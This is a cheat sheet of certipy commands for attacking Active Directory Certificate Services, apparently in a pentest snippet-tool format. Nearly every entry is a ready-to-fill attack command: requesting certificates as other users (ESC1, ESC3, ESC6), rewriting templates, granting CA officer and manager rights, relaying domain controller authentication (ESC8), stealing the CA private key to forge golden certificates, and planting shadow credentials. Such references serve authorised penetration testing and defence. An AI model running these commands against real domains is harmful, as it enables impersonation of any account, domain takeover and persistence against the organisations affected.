# certipy

% adcs, certificate, pki, windows, Active directory, template, shadow credential

## certipy - list certificate templates
#plateform/linux #target/remote #cat/RECON
```
certipy find <domain>/<user>:'<password>'@<dc-ip> 
```

## certipy - request certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certificate-authority>
```

## certipy - request previously issued certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy req <domain>/<user>:'<password>'@<ca-ip> -retrieve <csr-id> -ca <certificate-authority>
```

## certipy - authenticate with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy auth -pfx <pfx-file>
```

## certipy - Golden Certificate - steal CA certificate and private key
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca <domain>/<user>:'<password>'@<ca-ip> -backup
```

## certipy - Golden Certificate - forge certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy forge -ca-pfx <pfx-file> -alt <targeted-user>
```

## certipy - request certificate for another user - ESC1 - ESC6
#plateform/linux #target/remote #cat/ATTACK
```
certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certificate-authority> -alt <targeted-user>
```

## certipy - request certificate on behalf of with Certificate Request Agent certificate - ESC3
#plateform/linux #target/remote #cat/ATTACK
```
certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
```

## certipy - modify template in order to make it vulnerable to ESC1 - ESC4
#plateform/linux #target/remote #cat/ATTACK
```
certipy template <domain>/<user>:'<password>'@<ca-ip> -template <template> -save-old
```

## certipy - give Manage Certificates access right to user
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -add-officer <targeted-user>
```

## certipy - give Manage CA access right to user
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -add-manager <targeted-user>
```

## certipy - Enable specific template
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -enable-template <template>
```

## certipy - Issue CSR for specific request id - ESC7
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -issue-request <csr-id>
```

## certipy - relay authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy relay -ca <ca-ip>
```

## certipy - relay domain controller authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy relay -ca <ca-ip> -template 'DomainController'
```

## certipy - Add Key Credential to a target - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
```
certipy shadow add <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
```

## certipy - List Key Credentials for a target - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
```
certipy shadow list <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
```

## certipy - Show information about a specific Key Credential for a target - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
```
certipy shadow info <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user> -device-id <device-uuid>
```

## certipy - Remove a specific Key Credential for a target - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
```
certipy shadow remove <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user> -device-id <device-uuid>
```

## certipy - Remove all of the Key Credentials for a target - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
```
certipy shadow remove <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
```